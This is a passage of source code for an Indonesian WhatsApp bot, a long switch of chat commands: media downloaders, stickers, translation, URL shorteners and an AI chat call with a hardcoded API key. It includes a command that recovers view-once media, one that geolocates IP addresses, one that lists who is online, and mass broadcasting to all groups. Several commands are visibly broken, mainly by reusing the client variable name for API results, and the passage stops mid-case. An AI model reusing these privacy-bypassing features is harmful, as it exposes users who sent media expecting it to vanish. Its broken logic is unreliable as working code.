case 'bcgc': {
if (isBan) return m.reply(mess.ban)
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.bcgc halo semua todd*`)
    const wett = time => new Promise(res => setTimeout(res, time))
    let wip = await rezzx.groupFetchAllParticipating()
    let groups = Object.entries(wip).slice(0).map(entry => entry[1])
    let anu = groups.map(v => v.id)
    for (let i of anu) {
    await wett(500)
    rezzx.sendMessage(i,{image:{url: 'https://telegra.ph/file/f74b19656a41d6b10c480.png'}, caption: text, mentions: participants.map(a => a.id) },{})
    }
    m.reply(`*Sukses mengirim ke ${anu.length} group chat*`)
}
break

case 'lacakip': {
  if (isBan) return m.reply(mess.ban)
  if (m.isGroup) return m.reply(mess.priv);
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.lacakip 128.199.150.207*`)
    let mar = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
    await rezzx.sendMessage(m.chat, { location: { degreesLatitude: mar.latitude, degreesLongitude: mar.longitude }},{ ephemeralExpiration: 604800 });
    await delay(2000);
    m.reply(JSON.stringify(mar, null, 2));
}
break

case 'gpict': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.gpict anime girl*')
  wett()
  const map = require('d-scrape')
  const sip = await map.ai.gptPicture(text)
  rezzx.sendMessage(m.chat,{image:{url: sip.data.imgs[0]}},{})
  okk()
}

case 'drive' : case 'gdrive': {
 if (isBan) return m.reply(mess.ban)
	if (args.length == 0) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.drive https://drive.google.com/file/xxxxx*`)
	wett()
	let babyy = await (await fetch(`https://widipe.com/download/gdrive?url=${args[0]}`)).json()
    let baby1 = babyy.result
	if (baby1.fileSize.split('MB')[0] >= 1000) return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> *ukuran file terlalu besar, maximal 1GB*')
	
	let result4 = `🔧 *GOOGLE DRIVE DOWNLOADER*

🔖 *Name* : ${baby1.fileName}
💽 *Size* : ${baby1.fileSize}
📌 *Mime* : ${baby1.mimetype}
📎 *Link* : ${baby1.data}`
m.reply(`${result4}`)
rezzx.sendMessage(m.chat, { document : { url : baby1.data}, fileName : baby1.fileName, mimetype: baby1.mimetype }, { quoted : m })
okk()
}
break

case 'ig': case 'igdl': {
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} https://www.instagram.com/reel/C6F57rGrV_x/?igsh=OXJxanVpdHdiczVi`)
  try {
    let insta = await (await fetch(`https://api.shannmoderz.xyz/downloader/instagram?url=${text}`)).json()
    let rezzx = insta.result

    function formatComments(comments) {
      return comments.map(comment => 
        `user: ${comment.username}\nkomentar: ${comment.comment}\n`
      ).join('\n');
    }

    let caption = "Komentar:\n\n" + formatComments(rezzx.comments);
    rezzx.sendMessage(m.chat, { video: { url: rezzx.videoLink }, caption: caption }, { quoted: m })
  } catch (err) {
    m.reply('masukkan query lainnya atau coba lagi nanti')
  }
}
break

case 'fb': case 'facebook': 
  if (!text) return m.reply('masukkan url facebook');
  try {
    let fb = await (await fetch('https://api.shannmoderz.xyz/downloader/facebook?url=' + text)).json();
    let rezzx = fb.result[0];
    await rezzx.sendMessage(m.chat, { video: { url: rezzx.downloadLink }, caption: `*SUCCESS QUALITY ${rezzx.quality}*` },{ quoted: m });
} catch (e) {
    return m.reply('rezzx api sedang error,' + e);
}
break

case 'tiktok': case 'tt': case 'ttdl': {
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} https://vt.tiktok.com/ZSY98e83a/`)
  wett()
  try {
    let tiktok = await (await fetch(`https://api.shannmoderz.xyz/downloader/tiktok?url=${text}`)).json()
    let rezzx = tiktok.result.data
    rezzx.sendMessage( m.chat, { video: { url: rezzx.hdplay }, caption: `${rezzx.title}` },{ quoted: m })
    rezzx.sendMessage( m.chat, { audio: { url: rezzx.music }, mimetype: 'audio/mp4' })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
  okk()
}
break

case 'capcut': {
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} https://www.capcut.com/t/Zs8MPAKjG/`)
  try {
    wett()
    let capcut = await (await fetch(`https://api.shannmoderz.xyz/downloader/capcut?url=${text}`)).json()
    let rezzx = capcut.result
    rezzx.sendMessage( m.chat, { video: { url: rezzx.url }, caption: `*TITLE:* ${rezzx.title}\n*SIZE:* ${rezzx.size}` },{ quoted: m })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
  okk()
}
break

case 'snackvid': {
  if (!text) return m.reply(`*PERMINTAAN EROR!! CONTOH:*\n> .${command} https://s.snackvideo.com/p/j9jKr9dR`)
  try {
    wett()
    let snck = await (await fetch(`https://api.shannmoderz.xyz/downloader/snackvideo?url=${text}`)).json()
    let rezzx = snck.result
    rezzx.sendMessage( m.chat, { video: { url: rezzx.media }, caption: `*TITLE:* ${rezzx.title}\n*AUTHOR:* ${rezzx.author}\n*LIKE:* ${rezzx.like}` },{ quoted: m })
  } catch (err) {
      m.reply('masukkan url lainnya atau coba lagi nanti')
    }
  okk()
}
break

case 'mf': case 'mediafire': {
 if (isBan) return m.reply(mess.ban)
	if (args.length == 0) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.mediafire https://www.mediafire.com/download/xxxx*`)
	wett()
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 1000) return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> *ukuran file terlalu besar, maximal 1GB*')
	const result4 = `🔧 *MEDIAFIRE DOWNLOADER*

🔖 *Name* : ${baby1[0].nama}
💽 *Size* : ${baby1[0].size}
📌 *Mime* : ${baby1[0].mime}`
rezzx.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime, caption: result4 }, { quoted : m })
okk()
}
break

case 'get': {
  if (isBan) return m.reply(mess.ban)
  if (!/^https?:\/\//.test(text)) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.get https://dikaardnt.com/api/search/otakudesu?q=bruto*`)
  let linknyaurl = await shorturl(text)
  let _url = new URL(text)
  let url = `${_url.origin}${_url.pathname}${_url.search}`;
  let res = await fetch(url)
  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
    delete res
    return m.reply( `Content-Length: ${res.headers.get('content-length')}`)
  }
  if (!/text|json/.test(res.headers.get('content-type'))) return rezzx.sendFile(m?.chat, url, 'file', `*RequestBy*: @${m.sender.split('@')[0]}\n*Link:* ${text}`, m)
  let txt = await res.buffer()
  try {
    txt = util.format(JSON.parse(txt + ''))
  } catch (e) {
      txt = txt + ''
    } finally {
        m.reply(txt.slice(0, 65536) + '')
      }
}
break

case "rvo": case "readvo": {
  if (isBan) return m.reply(mess.ban)
  if (!m.quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim pesan 1x lihat dengan caption .rvo*`);
  if (m.quoted.mtype !== "viewOnceMessageV2") return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *ini bukan pesan 1x lihat!!*`);
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  let media = await downloadContentFromMessage(
      msg[type],
      type == "imageMessage" ? "image" : "video",
  );
  let buffer = Buffer.from([]);
  for await (const chunk of media) {
      buffer = Buffer.concat([buffer, chunk]);
  }
  let tempFilePath = path.join('/tmp', type == "imageMessage" ? "media.jpg" : "media.mp4");
  fs.writeFileSync(tempFilePath, buffer);
  if (/video/.test(type)) {
      return rezzx.sendFile(
          m.chat,
          tempFilePath,
          "media.mp4",
          msg[type].caption || "",
          m,
      );
  } else if (/image/.test(type)) {
      return rezzx.sendFile(
          m.chat,
          tempFilePath,
          "media.jpg",
          msg[type].caption || "",
          m,
      );
  }
}
break

case 'wikipedia': {
  if (!text) return m.reply('mau searching apa?')
  
  let api = await (await fetch('https://api.shannmoderz.xyz/berita/wikipedia?query=' + text)).json()
  if (api.status && api.code === 200 && api.result && api.result.results) {
    let allText = api.result.results.map(item => 
      `*${item.title}*\n${item.extract}`
    ).join('\n\n\n');
    let availableImages = api.result.results
      .filter(item => item.thumbnail)
      .map(item => item.thumbnail);
    let randomImage = availableImages.length > 0 
      ? availableImages[Math.floor(Math.random() * availableImages.length)]
      : 'https://telegra.ph/file/dda0b1de238cee3556023.jpg'; 
   
 rezzx.sendMessage(m.chat, { image: { url: randomImage }, caption: `Hasil pencarian untuk "${api.result.search_term}":\n\n${allText}` }, { quoted: m });
  } else {
    return m.reply('Maaf, tidak dapat menemukan hasil untuk pencarian tersebut.')
  }
}
break

case 'removebg':
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPH(mee)
  let rezzx = await (await fetch(`https://api.shannmoderz.xyz/tools/removebg?url=${mem}`)).json()
  let bg = rezzx.result.image
  rezzx.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break

case 'tozombie': case 'jadizombie':
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .tozombie*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .tozombie*`)
  if (/image/.test(mime)) {
    m.reply(mess.wait)
    let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
    let mem = await TelegraPH(mee)
    let kaytid = await (await fetch(`https://widipe.com/converter/zombie?url=${mem}`)).json()
    let po = kaytid.url
    rezzx.sendMessage(m.chat,{image:{url: po}, caption: '*SUCCESS* ✅'},{quoted: m})
  }
break


case 'smemev3':
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev3*\n*CONTOH :*\n> *.smemev3 halo|bang*`)
if (!quoted) return m.reply( `*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev3*\n*CONTOH :*\n> *.smemev3 halo|bang*`)
if (/image/.test(mime)) {
m.reply('_Processing....._')
bn1 = text.split("|")[0]
bn2 = text.split("|")[1]
mee = await rezzx.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/${bn1}/${bn2}.png?background=${mem}`)
rezzx.sendStickerImg(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break

case 'smemev2':
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev2*\n*CONTOH :*\n> *.smemev2 halo dekk*`)
if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev2*\n*CONTOH :*\n> *.smemev2 halo dekk*`)
if (/image/.test(mime)) {
m.reply('_Processing....._')
mee = await rezzx.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/${text}/-.png?background=${mem}`)
rezzx.sendStickerImg(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break

case 'smemev1':
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev1*\n*CONTOH :*\n> *.smemev1 halo bruhh*`)
if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *repy/kirim gambar dengan caption .smemev1*\n*CONTOH :*\n> *.smemev1 halo bruhh*`)
if (/image/.test(mime)) {
m.reply('_Processing....._')
mee = await rezzx.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
rezzx.sendStickerImg(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break

case "disk":{
  if (isBan) return m.reply(mess.ban)
  exec('cd && du -h --max-depth=1', (err, stdout) => {
    if (err) return m.reply(`${err}`)
    if (stdout) return m.reply(stdout)
  })
}
break

case 'kodebahasa': 
if (isBan) return m.reply(mess.ban)
let { kodebahasa } = require('./lib/listmenu.js')
let menunya$ = kodebahasa( prefix )
let kde = 'https://telegra.ph/file/3ddebdc1fed5cc9a93b43.png'
xreply(menunya$, kde)
break

case 'shortlink': {
if (isBan) return m.reply(mess.ban)
m.reply(`*PILIH SERVER SHORTLINK YANG DIINGINKAN*

> *.TINYURL*
> *.ITZPIRE*
> *.ISGD*
> *.VGD*
> *.VURL*

> _© RezzX-V12_`)
}
break 

case 'del': case 'delete':{
  if (isBan) return m.reply(mess.ban)
  rezzx.sendMessage(m.chat,{delete: {remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
}
break

case 'enc': case 'encrypt': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.enc const axios = require('peler🗿')*`)
  let meg = await obfus(q)
  m.reply(`${meg.result}`)
}
break

case 'tts':{
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tts aku adalah raja land of down*`)
  const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
  const b = Buffer.from(a.audioUrl)
  rezzx.sendMessage(m.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break

case "jarak":{
  if (isBan) return m.reply(mess.ban)
  var [fromo, to] = text.split`|`
  if (!(fromo && to)) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.jarak jakarta|bandung*`)
  var dataa = await jarak(fromo, to)
  if (dataa.img) return rezzx.sendMessage(m.chat, { image: dataa.img, caption: dataa.desc }, { quoted: m })
  else m.reply(dataa.desc)
}
break

case "tr": case 'translate': {
  if (isBan) return m.reply(mess.ban)
  let lang, text
  if (args.length >= 2) {
    lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
  } else if (m.quoted && m.quoted.text) {
      lang = args[0] ? args[0] : 'id', text = m.quoted.text
    } else return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.tr id are you crazy?*`)
  const translate = require('@vitalets/google-translate-api')
  let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
  if (!res) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Bahasa ${lang} tidak tersedia*`)
  m.reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break

case 'sticker': case 'stiker': case 's': {
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .s*`)
  if (/image/.test(mime)) {
    wett()
    let media = await quoted.download()
    let encmedia = await rezzx.sendStickerImg(m.chat, media, m, {packname: global.packname,author: global.author})
    await fs.unlinkSync(encmedia)
  } else if (/video/.test(mime)) {
      if ((quoted.msg || quoted).seconds > 11) return m.reply('*PERMINTAAN EROR!! PESAN :*\n> *Gunakan Maksimal 10 detik*')
      let media = await quoted.download()
      let encmedia = await rezzx.sendStickerVid(m.chat, media, m, {packname: global.packname,author: global.author})
      await fs.unlinkSync(encmedia)
    } else {
        return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .s*`)
      }
    okk()
}
break

case "delcase":{
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!q) return m.reply("*PERMINTAAN ERROR!! CONTOH :*\n> *.delcase namacase*");
    dellCase("./rezzx.js", q);
    m.reply(`*CASE ${text} SUKSES DI HAPUS*`);
}
break

case 'itzpire': {
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.itzpire linknya|costume name*')
  bn1 = text.split("|")[0]
  bn2 = text.split("|")[1]
  let sh = await (await fetch(`https://itzpire.com/tools/shorten?longUrl=${bn1}&customName=${bn2}`)).json()
  rezzx.sendMessage(m.chat, {text: `*PROCCESS SUCCESS* ✅\n*Link:*\n${bn1}\n*ShortLink:*\n${sh.data.shortUrl}\n\n> support by itzpire.com`}, {quoted: m})
}
break

case 'vurl': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.vurl linknya*')
  let shortUrl = await (await fetch(`https://widipe.com/vurl?link=${args[0]}`)).text();
  if (!shortUrl) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *tidak dapat membuat link*`);
  let done = `*PROCESS SUCCESS* ✅\n*Link:*\n${text}\n*ShortLink:*\n${shortUrl.result}`.trim();
  m.reply(done)
}
break

case 'vgd': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.vgd linknya*')
  let shortUrl = await (await fetch(`https://widipe.com/vgd?link=${args[0]}`)).text();
  if (!shortUrl) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *tidak dapat membuat link*`);
  let done = `*PROCESS SUCCESS* ✅\n*Link:*\n${text}\n*ShortLink:*\n${shortUrl.hasil.shorturl}`.trim();
  m.reply(done)
}
break

case 'isgd': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.isgd linknya*')
  let shortUrl = await (await fetch(`https://widipe.com/isgd?link=${args[0]}`)).text();
  if (!shortUrl) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *tidak dapat membuat link*`);
  let done = `*PROCESS SUCCESS* ✅\n*Link:*\n${text}\n*ShortLink:*\n${shortUrl.hasil.shorturl}`.trim();
  m.reply(done)
}
break

case 'tinyurl': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.tinyurl linknya*')
  let shortUrl = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
  if (!shortUrl) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *tidak dapat membuat link*`);
  let done = `*PROCESS SUCCESS* ✅\n*Link:*\n${text}\n*ShortLink:*\n${shortUrl}`.trim();
  m.reply(done)
}
break

case'cekip': case 'myip': {
  if (isBan) return m.reply(mess.ban)
  if (m.isGroup) return m.reply(mess.priv);
  var http = require('http')
  http.get({
   'host': 'api.ipify.org',
   'port': 80,
   'path': '/'
  }, function(resp) {
       resp.on('data', function(ip) {
         m.reply("🔎 *Ip Privatmu Adalah :* " + ip);
       })
      })
}
break

case 'listonline': case 'liston': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
  let online = [...Object.keys(store.presences[id]), botNumber]
  rezzx.sendText(m.chat, '🔊 *LIST ONLINE:*\n\n' + online.map(v => '> @' + v.replace(/@.+/, '')).join`\n`, m, {
    mentions: online
  })
}
break

    case 'pin': case 'pinterest': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.pin kayes hot*')
  async function createImage(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: rezzx.waUploadToServer
  })
  return imageMessage
}
let push = []
let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`)
let res = data.resource_response.data.results.map(v => v.images.orig.url);
let ult = res.splice(0, 4)
let i = 1
for (let pus of ult) {
push.push({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `Hasil Pencarian Ke - ${i++}`
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: '_*© RezzX-V12*_'
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Hasil Dari : ${text}`,
                hasMediaAttachment: true,
                imageMessage: await createImage(pus)
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
              {
              "name": "cta_url",
              "buttonParamsJson": `{"display_text":"Lihat Di Web","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
              }
                ]
              })
            })
}

const msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.create({
            text: `Hai kak *${pushname}*\nBerikut Hasil Pencarianmu`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '_*© RezzX-V12*_'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            ...push
                ]
              })
        })
      }
      }
      }, { quoted: m })

await rezzx.relayMessage(m.chat, msg.message, {
  messageId: msg.key.id
})
}
break

case 'addcase': {
  if (isBan) return m.reply(mess.ban)
  if (!isOwner) return m.reply(mess.owner)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> .addcase case \'test\': {\n> m.reply('hello world')\n> }\n> break`)

  const fileName = 'rezzx.js';
  const newCase = `${text}`;
  fs.readFile(fileName, 'utf8', (err, data) => {
    if (err) {
      console.error('*ERROR SAAT MEMBACA FILE*', err);
      return;
    }
    const posisiAwal = data.indexOf("case 'addcase':");
    if (posisiAwal !== -1) {
      const kodeBaru = data.slice(0, posisiAwal) + '\n' + newCase + '\n' + data.slice(posisiAwal);
      fs.writeFile(fileName, kodeBaru, 'utf8', (err) => {
        if (err) {
          m.reply('*TERJADI KESALAHAN SAAT MENULIS CASE* :', err);
        } else {
          m.reply('*CASE SUKSES DITAMBAHKAN*');
    }});
    } else {
        m.reply('*CASE ADDCASE TIDAK DITEMUKAN');
    }});
}
break

case 'qc': {
if (isBan) return m.reply(mess.ban)
if (!q) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.qc magenta halo*\n*PESAN :*\n> *.warnaqc untuk melihat daftar warna*`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> *warna tidak tersedia*\n*CONTOH :*\n> *.qc white halo*\n*NOTE :*\n> *.warnaqc untuk melihat daftar warna*')
}
let obj = { type: 'quote', format: 'png', backgroundColor, width: 512, height: 768, scale: 2, messages: [{ entities: [], avatar: true, from: { id: 1, name: pushname, photo: { url: await rezzx.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'), }}, text: message, replyMessage: {}, }, ], };
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, { headers: { 'Content-Type': 'application/json', }, });
let buffer = Buffer.from(response.data.result.image, 'base64');
rezzx.sendStickerImg(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break

case 'warnaqc': 
if (isBan) return m.reply(mess.ban)
let { warnaqc } = require('./lib/listmenu.js')
let menunya$$ = warnaqc(  prefix )
let qcc = 'https://telegra.ph/file/155c85b8e36679af02988.png'
xreply(menunya$$, qcc)

break

case 'couple': {
  if (isBan) return m.reply(mess.ban)
  let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
  let random = anu[Math.floor(Math.random() * anu.length)]
  rezzx.sendMessage(from, { image: { url: random.male }, caption: `🚹 *UNTUK LAKI-LAKI*` }, {quoted:m})
  rezzx.sendMessage(from, { image: { url: random.female }, caption: `🚺 *UNTUK PEREMPUAN*` }, {quoted:m})
}
break

case 'ytsearch': {
if (isBan) return m.reply(mess.ban)
if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} not you*`)
if (text.length > 25) return m.reply(`*PERMINTAAN EROR!! PESAN :*\n> *Gunakan Maksimal 25 Huruf*`)
let res = await yts(text)
let url = res.all;
let result = url[Math.floor(Math.random() * url.length)]
teks = `🔎 *YOUTUBE SEARCH*\n\n> *Judul : ${result.title}*\n> *Upload : ${result.ago}*\n> *Url : ${result.url}*`
rezzx.sendMessage(m.chat, { image: { url: result.thumbnail },  caption: teks }, { quoted: m })
}
break

case 'emidiff': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.emidiff balck dog*')
  try {
    let dif = await getBuffer(`https://widipe.com/stablediffusion?text=${text}`)
    rezzx.sendMessage(m.chat, {image : dif, caption: '*SUCCES* ✅'},{quoted: m})
  } catch (err) {
      m.reply('erorr')
    }
}
break
    
case 'rezzx': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.rezzx siapa kamu?*')
 try {
   rezzx.sendMessage(m.chat, {react: { text: '🕒', key: m.key,}})
   let identitas = 'your name is rezzx try to help people with all your heart and give the best answers, you can only speak Indonesian and English apart from that you cant'
   let rezzx = await (await fetch(`https://anabot.my.id/api/ai/groq?system=${identitas}&prompt=${text}&apikey=DitzOfc`)).json()
   let nam = 'rezzx AI'
   let ses = 'session: false'
   let bii = 'https://telegra.ph/file/49b7bf3389d3ca6f4345c.jpg'
   replyai(rezzx.result, nam, ses, bii)
   rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
 } catch (err) {
     m.reply(mess.error)
   }
}
break

case 'simi': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.simi halo sayang*')
  try {
    rezzx.sendMessage(m.chat, {react: { text: '🕒', key: m.key,}})
    let sim = await (await fetch(`https://widipe.com/simi?text=${text}`)).json()
    let hss = 'SIMI AI'
    let shh = 'session: false'
